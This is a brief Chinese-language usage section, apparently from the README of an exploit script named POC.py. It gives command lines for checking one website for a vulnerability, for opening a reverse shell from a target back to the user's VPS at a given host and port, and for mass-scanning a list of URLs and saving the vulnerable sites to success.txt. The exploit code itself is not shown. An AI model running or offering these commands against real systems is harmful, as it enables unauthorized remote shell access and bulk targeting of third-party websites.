用法

单个网站的漏洞验证

python POC.py -u https://1.1.1.1

将外壳反向连接到您的VPS主机

python POC.py -e https://1.1.1.1 -rh 2.2.2.2 -rp 9999

对一个文件中的多个网站执行漏洞检查，有漏洞的网站将被输出到success.txt文件

python3 POC.py -f urls.txt
